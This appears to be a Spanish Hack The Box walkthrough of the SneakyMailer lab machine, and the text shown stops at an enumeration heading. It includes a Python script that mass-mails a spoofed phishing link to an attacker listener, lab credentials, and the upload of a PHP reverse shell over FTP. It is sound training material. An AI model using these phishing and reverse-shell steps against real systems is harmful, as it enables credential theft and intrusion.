@@ -1,0 +1,990 @@
+I"�<h2 id="resumen">Resumen:</h2>
+
+<p><code class="language-plaintext highlighter-rouge">SneakyMailer</code> es una máquina nivel intermedio bastante interesante. Con el primer barrido de nmap encontraremos un nuevo dominio <code class="language-plaintext highlighter-rouge">sneakycorp.htb</code> que en su sitio web contiene numerosos <code class="language-plaintext highlighter-rouge">emails</code> los cuales tendremos que hacerles un ataque de <code class="language-plaintext highlighter-rouge">phishing</code> para obtener el password que usaremos en el servidor <code class="language-plaintext highlighter-rouge">smtp</code>.</p>
+
+<p>Luego de revisar los correos encontramos otras credenciales, que usaremos en el servidor <code class="language-plaintext highlighter-rouge">FTP</code>. Nos damos cuenta que podemos subir un reverse shell php y así alcanzar el RCE, pero con otro dominio que tuvimos que encontrar haciendo fuzzing <code class="language-plaintext highlighter-rouge">dev.sneakycorp.htb</code>.</p>
+
+<p>Entramos como <code class="language-plaintext highlighter-rouge">www-data</code> y nos topamos con un hash del <code class="language-plaintext highlighter-rouge">pypiserver</code>. Lo que hicimos fue subir un paquete con nuestro payload al servidor que nos sirvió para conseguir el user.txt como low.</p>
+
+<p>Lo próximo que hicimos para obtener nuestro preciado root.txt fue bastante sencillo, ya que podemos ejecutar pip3 como sudo, y usando las técnicas de <code class="language-plaintext highlighter-rouge">gtfobins</code> somos capaces de escalar hacia ¡<code class="language-plaintext highlighter-rouge">Root</code>!.</p>
+
+<hr />
+
+<h2 id="pwned">Pwned</h2>
+<link rel="stylesheet" type="text/css" href="/assets/css/asciinema-player.css" />
+
+<asciinema-player src="/htb/sneakymailer/root.cast" cols="107" rows="24"></asciinema-player>
+<script type="text/javascript" src="/assets/js/asciinema-player.js"></script>
+
+<hr />
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+
+<p>Acá nos damos cuenta de varias cosas bastante útiles, la primera es que está corriendo los servicios ftp y un servidor de correos, además descubrimos un dominio <strong>sneakycorp.htb</strong>. Y el puerto 8080 que por ahora no sabemos que es lo que está corriendo. ¡Sigamos!</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre></td> --><td class="rouge-code"><pre><span class="go">
+Nmap scan report for 10.10.10.197
+PORT     STATE SERVICE  VERSION
+21/tcp   open  ftp      vsftpd 3.0.3
+22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
+|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
+|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
+25/tcp   open  smtp     Postfix smtpd
+|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+80/tcp   open  http     nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+|_http-title: Did not follow redirect to http://sneakycorp.htb
+143/tcp  open  imap     Courier Imapd (released 2018)
+|_imap-capabilities: IDLE ENABLE SORT OK ACL QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN STARTTLS ACL2=UNION UIDPLUS
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+993/tcp  open  ssl/imap Courier Imapd (released 2018)
+|_imap-capabilities: IDLE ENABLE SORT OK ACL AUTH=PLAIN QUOTA IMAP4rev1 THREAD=ORDEREDSUBJECT THREAD=REFERENCES CAPABILITY NAMESPACE UTF8=ACCEPTA0001 completed CHILDREN ACL2=UNION UIDPLUS
+| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
+| Subject Alternative Name: email:postmaster@example.com
+| Not valid before: 2020-05-14T17:14:21
+|_Not valid after:  2021-05-14T17:14:21
+|_ssl-date: TLS randomness does not represent time
+8080/tcp open  http     nginx 1.14.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: nginx/1.14.2
+|_http-title: Welcome to nginx!
+</span><span class="gp">Service Info: Host:  debian;</span><span class="w"> </span>OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Ok, agregamos el nuevo dominio al archivo hosts y exploramos un poco a ver que nos encontramos.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span><span class="nb">sudo </span>nano /etc/hosts
+<span class="go">127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.197    sneakycorp.htb
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>En la sección de team <code class="language-plaintext highlighter-rouge">http://sneakycorp.htb/team.php</code> nos vamos a encontrar con un montón de cuentas emails con el siguiente dominio <code class="language-plaintext highlighter-rouge">sneakymailer.htb</code>
+lo agregamos también a el archivo hosts.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="go">127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.197    sneakycorp.htb sneakymailer.htb
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Podemos extraer fácilmente las cuentas de correos con esta aplicación. <a href="https://email-checker.net/extract-email"><strong>email-checker</strong></a>
+Hacemos ctrl + a 
+copiamos, pegamos en la herramienta y extraemos.
+<img src="/htb/sneakymailer/email3.png" alt="Desktop View" /></p>
+
+<p>Lo guardamos todo en un archivo llamado emails.txt</p>
+
+<p><img src="/htb/sneakymailer/saved_emails.png" alt="Desktop View" /></p>
+
+<p>Lo que vamos a hacer ahora es probar si podemos mandar correos a esos usuarios, con una herramienta llamada <a href="https://github.com/jetmore/swaks"><strong>Swaks</strong></a> <strong><em>(Swiss Army Knife for SMTP).</em></strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="go">./swaks --from "testing@sneakymailer.htb" --body "Prueba" --to tigernixon@sneakymailer.htb
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre></td> --><td class="rouge-code"><pre><span class="go">=== Trying sneakymailer.htb:25...
+=== Connected to sneakymailer.htb.
+&lt;-  220 debian ESMTP Postfix (Debian/GNU)
+</span><span class="gp"> -&gt;</span><span class="w"> </span>EHLO kali
+<span class="go">&lt;-  250-debian
+&lt;-  250-PIPELINING
+&lt;-  250-SIZE 10240000
+&lt;-  250-VRFY
+&lt;-  250-ETRN
+&lt;-  250-STARTTLS
+&lt;-  250-ENHANCEDSTATUSCODES
+&lt;-  250-8BITMIME
+&lt;-  250-DSN
+&lt;-  250-SMTPUTF8
+&lt;-  250 CHUNKING
+</span><span class="gp"> -&gt;</span><span class="w"> </span>MAIL FROM:&lt;testing@sneakymailer.htb&gt;
+<span class="go">&lt;-  250 2.1.0 Ok
+</span><span class="gp"> -&gt;</span><span class="w"> </span>RCPT TO:&lt;tigernixon@sneakymailer.htb&gt;
+<span class="go">&lt;-  250 2.1.5 Ok
+</span><span class="gp"> -&gt;</span><span class="w"> </span>DATA
+<span class="gp">&lt;-  354 End data with &lt;CR&gt;</span>&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+<span class="gp"> -&gt;</span><span class="w"> </span>Date: Fri, 04 Dec 2020 10:06:00 <span class="nt">-0500</span>
+<span class="gp"> -&gt;</span><span class="w"> </span>To: tigernixon@sneakymailer.htb
+<span class="gp"> -&gt;</span><span class="w"> </span>From: testing@sneakymailer.htb
+<span class="gp"> -&gt;</span><span class="w"> </span>Subject: <span class="nb">test </span>Fri, 04 Dec 2020 10:06:00 <span class="nt">-0500</span>
+<span class="gp"> -&gt;</span><span class="w"> </span>Message-Id: &lt;20201204100600.004459@kali&gt;
+<span class="gp"> -&gt;</span><span class="w"> </span>X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+<span class="gp"> -&gt;</span><span class="w"> 
+</span><span class="gp"> -&gt;</span><span class="w"> </span>Prueba
+<span class="gp"> -&gt;</span><span class="w"> 
+</span><span class="gp"> -&gt;</span><span class="w"> 
+</span><span class="gp"> -&gt;</span><span class="w"> </span><span class="nb">.</span>
+<span class="go">&lt;-  250 2.0.0 Ok: queued as 9F84324961
+</span><span class="gp"> -&gt;</span><span class="w"> </span>QUIT
+<span class="go">&lt;-  221 2.0.0 Bye
+=== Connection closed with remote host.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Perfecto el correo se envió exitosamente.</p>
+
+<hr />
+
+<h2 id="phishing-a-los-empleados">Phishing a los empleados</h2>
+
+<p>Podemos automatizar esta tarea haciendo un script en python para poder enviarle el phishing a cada usuario. Entonces nuestro código sería algo así:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python                               
+</span><span class="kn">import</span> <span class="nn">os</span>
+<span class="k">def</span> <span class="nf">leer_emails</span><span class="p">(</span><span class="n">archivo</span><span class="p">):</span>
+	<span class="k">return</span> <span class="p">[</span><span class="n">item</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span> <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">archivo</span><span class="p">).</span><span class="n">readlines</span><span class="p">()]</span>
+<span class="n">lista_emails</span> <span class="o">=</span> <span class="n">leer_emails</span><span class="p">(</span><span class="s">"emails.txt"</span><span class="p">)</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">1</span>
+
+<span class="k">for</span> <span class="n">emails</span> <span class="ow">in</span> <span class="n">lista_emails</span><span class="p">:</span>
+	<span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">[{}] -- Enviando Phishing a [{}]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">n</span><span class="p">,</span><span class="n">emails</span><span class="p">)</span> 
+	<span class="n">comando</span> <span class="o">=</span> <span class="s">'swaks -from "ceo@sneakymailer.htb" -body " http://10.10.14.63:8080" --to '</span> <span class="o">+</span> <span class="n">emails</span> <span class="o">+</span> <span class="s">" -server 10.10.10.197 -header 'Subject: Importante' &gt; /dev/null "</span> 
+	<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="n">comando</span><span class="p">)</span>
+	<span class="n">n</span><span class="o">+=</span><span class="mi">1</span>
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Nos ponemos a la escucha en el puerto <code class="language-plaintext highlighter-rouge">8080</code> para capturar cualquier respuesta.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 8080
+<span class="go">listening on [any] 8080 ...
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Muy bien, parece que paulbyrd accedió al link.</p>
+<asciinema-player src="/htb/sneakymailer/email.cast" cols="100" rows="20"></asciinema-player>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="go">firstName=Paul&amp;lastName=Byrd&amp;email=paulbyrd%40sneakymailer.htb&amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Decodeamos el passowrd con  <a href="https://www.urldecoder.org/"><strong>urldecoder</strong></a> y ya con esto ya tendríamos nuestras primeras credenciales <code class="language-plaintext highlighter-rouge">paulbyrd:^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code></p>
+
+<hr />
+
+<h2 id="imap">IMAP</h2>
+
+<p>Ya que las credenciales no funcionaron  con el ftp lo que hice fue intentar acceder al servidor imap en el puerto 143 y revisar si existe alguna información valiosa en los correos.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>nc sneakycorp.htb 143
+<span class="go">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">0 login paulbyrd ^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code></p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>nc sneakycorp.htb 143
+<span class="go">* OK [CAPABILITY IMAP4rev1 UIDPLUS CHILDREN NAMESPACE THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT QUOTA IDLE ACL ACL2=UNION STARTTLS ENABLE UTF8=ACCEPT] Courier-IMAP ready. Copyright 1998-2018 Double Precision, Inc.  See COPYING for distribution information.
+</span><span class="gp">0 login paulbyrd ^(#</span>J@SkFv2[%KhIxKk<span class="o">(</span>Ju<span class="sb">`</span>hqcHl&lt;:Ht
+<span class="go">* OK [ALERT] Filesystem notification initialization error -- contact your mail administrator (check for configuration errors with the FAM/Gamin library)
+0 OK LOGIN Ok.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">1 list "" *</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="go">1 list "" *
+* LIST (\Unmarked \HasChildren) "." "INBOX"
+* LIST (\HasNoChildren) "." "INBOX.Trash"
+* LIST (\HasNoChildren) "." "INBOX.Sent"
+* LIST (\HasNoChildren) "." "INBOX.Deleted Items"
+* LIST (\HasNoChildren) "." "INBOX.Sent Items"
+1 OK LIST completed
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Tenemos 2 correos en “Inbox/Sent Items” veamos que hay dentro.</p>
+
+<p><code class="language-plaintext highlighter-rouge">02 SELECT "INBOX.Sent Items"</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="go">02 SELECT "INBOX.Sent Items"
+* FLAGS (\Draft \Answered \Flagged \Deleted \Seen \Recent)
+* OK [PERMANENTFLAGS (\* \Draft \Answered \Flagged \Deleted \Seen)] Limited
+* 2 EXISTS
+* 0 RECENT
+* OK [UIDVALIDITY 589480766] Ok
+* OK [MYRIGHTS "acdilrsw"] ACL
+02 OK [READ-WRITE] Ok
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Email 1: En este correo conseguimos otras credenciales que probablemente funcionaran en el servidor ftp.</p>
+
+<p><code class="language-plaintext highlighter-rouge">03 FETCH 1 BODY[]</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td> --><td class="rouge-code"><pre><span class="go">03 fetch 1 BODY[]
+* 1 FETCH (BODY[] {2167}
+MIME-Version: 1.0
+</span><span class="gp">To: root &lt;root@debian&gt;</span><span class="w">
+</span><span class="gp">From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;</span><span class="w">
+</span><span class="go">Subject: Password reset
+Date: Fri, 15 May 2020 13:03:37 -0500
+Importance: normal
+X-Priority: 3
+</span><span class="gp">Content-Type: multipart/alternative;</span><span class="w">
+</span><span class="go">        boundary="_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"
+
+--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_
+Content-Transfer-Encoding: quoted-printable
+</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span>
+<span class="go">
+Hello administrator, I want to change this password for the developer accou=
+nt
+
+Username: developer
+Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+Please notify me when you do it=20
+
+Hello administrator, I want to chang=
+e this password for the developer account
+Username: developer Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+
+Please notify me when you do i=
+
+03 OK FETCH completed.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Email 2: Este email es bastante interesante, seguro nos servirá para más tarde.</p>
+
+<p><code class="language-plaintext highlighter-rouge">03 FETCH 2 BODY[]</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+</pre></td> --><td class="rouge-code"><pre><span class="go">03 fetch 2 body[]
+* 2 FETCH (BODY[] {585}
+To: low@debian
+</span><span class="gp">From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;</span><span class="w">
+</span><span class="go">Subject: Module testing
+</span><span class="gp">Message-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;</span><span class="w">
+</span><span class="go">Date: Wed, 27 May 2020 13:28:58 -0400
+</span><span class="gp">User-Agent: Mozilla/5.0 (X11;</span><span class="w"> </span>Linux x86_64<span class="p">;</span> rv:68.0<span class="o">)</span> Gecko/20100101
+<span class="go"> Thunderbird/68.8.0
+MIME-Version: 1.0
+</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8<span class="p">;</span> <span class="nv">format</span><span class="o">=</span>flowed
+<span class="go">Content-Transfer-Encoding: 7bit
+Content-Language: en-US
+
+Hello low
+
+
+Your current task is to install, test and then erase every python module you 
+find in our PyPI service, let me know if you have any inconvenience.
+
+)
+03 OK FETCH completed.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<hr />
+
+<h2 id="ftp">FTP</h2>
+
+<p>FTP Credenciales: <code class="language-plaintext highlighter-rouge">Username: developer Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">cd </span>dev
+<span class="go">250 Directory successfully changed.
+</span><span class="gp">ftp&gt;</span><span class="w"> </span>put file.txt
+<span class="go">local: file.txt remote: file.txt
+200 PORT command successful. Consider using PASV.
+150 Ok to send data.
+226 Transfer complete.
+</span><span class="gp">ftp&gt;</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Somos capaces de subir archivos al servidor, pero no lo encontramos cuando hacemos <code class="language-plaintext highlighter-rouge">dir</code> por lo tanto probablemente el directorio <code class="language-plaintext highlighter-rouge">dev</code> este oculto en otro host.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td> --><td class="rouge-code"><pre><span class="gp"> ftp&gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 May 26  2020 css
+drwxr-xr-x    2 0        0            4096 May 26  2020 img
+-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
+drwxr-xr-x    3 0        0            4096 May 26  2020 js
+drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
+drwxr-xr-x    4 0        0            4096 May 26  2020 scss
+-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
+drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
+226 Directory send OK.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Intente subir una reverse shell y acceder a través de http://sneakycorp.htb/0xdeed.php pero no estaba ahi, por lo tanto llegue a la conclusión de que debe estar en otro dominio o subdominio.</p>
+
+<h2 id="fuzzing-host">Fuzzing Host</h2>
+
+<p>Utilizamos wfuzz para encontrar el subdominio, y tal como esperábamos es <code class="language-plaintext highlighter-rouge">dev.sneakycorp.htb</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="go">wfuzz -H "HOST: FUZZ.sneakycorp.htb" -u http://10.10.10.197/ -w /usr/share/wordlists/dirb/common.txt --hh 173,185
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>wfuzz <span class="nt">-H</span> <span class="s2">"HOST: FUZZ.sneakycorp.htb"</span> <span class="nt">-u</span> http://10.10.10.197/ <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">--hh</span> 173,185
+<span class="go">
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.197/
+Total requests: 4614
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload             
+===================================================================
+
+000001241:   200        340 L    989 W    13737 Ch    "dev"
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Agregamos a nuestro archivo hosts.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="go">127.0.0.1       localhost
+127.0.1.1       kali
+10.10.10.197    sneakycorp.htb sneakymailer.htb  dev.sneakycorp.htb
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Y ahora accedemos al servidor ftp con el nuevo subdominio y comprobamos que ahora si podemos acceder al archivo y por lo tanto obtener nuestra shell.</p>
+
+<hr />
+
+<h2 id="lfi-to-rce">LFI TO RCE</h2>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>ftp dev.sneakycorp.htb
+<span class="go">Connected to sneakycorp.htb.
+220 (vsFTPd 3.0.3)
+Name (dev.sneakycorp.htb:kali): developer
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Utilizamos el  <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php"><strong>php_reverse_shell</strong></a> de pentestmonkey remplazamos la ip a la nuestra y el puerto donde estaremos a la escucha.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre><span class="gp">ftp&gt;</span><span class="w"> </span>put 0xdeed.php 
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Como podemos observar ahora si podemos encontrar nuestro backdoor.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">dir</span>
+<span class="go">200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+--wxrw-rw-    1 1001     1001         5493 Dec 04 11:44 0xdeed.php
+drwxr-xr-x    2 0        0            4096 May 26  2020 css
+drwxr-xr-x    2 0        0            4096 May 26  2020 img
+-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
+drwxr-xr-x    3 0        0            4096 May 26  2020 js
+drwxr-xr-x    2 0        0            4096 May 26  2020 pypi
+drwxr-xr-x    4 0        0            4096 May 26  2020 scss
+-rwxr-xr-x    1 0        0           26523 May 26  2020 team.php
+drwxr-xr-x    8 0        0            4096 May 26  2020 vendor
+226 Directory send OK.
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<hr />
+
+<h2 id="usertxt">User.txt</h2>
+<p>triggereamos en <code class="language-plaintext highlighter-rouge">http://dev.sneakycorp.htb/0xdeed.php</code> y ¡Listo! tenemos la primera shell.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre><span class="gp">kali@kali:~$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 4949
+<span class="go">listening on [any] 4949 ...
+connect to [10.10.14.63] from (UNKNOWN) [10.10.10.197] 56796
+</span><span class="gp">Linux sneakymailer 4.19.0-9-amd64 #</span>1 SMP Debian 4.19.118-2 <span class="o">(</span>2020-04-29<span class="o">)</span> x86_64 GNU/Linux
+<span class="go"> 11:45:54 up 10:38,  0 users,  load average: 0.02, 0.05, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
+<span class="gp">$</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Podemos hacer un <code class="language-plaintext highlighter-rouge">su</code> hacia el usuario developer con las mismas credenciales</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre><span class="gp">www-data@sneakymailer:/$</span><span class="w"> </span>su developer
+<span class="go">Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
+</span><span class="gp">developer@sneakymailer:/$</span><span class="w"> 
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<h3 id="enumeración">Enumeración</h3>
+<p>Al rato de echar un vistazo y enumerar me encuentro con los siguientes usuarios:</p>
+
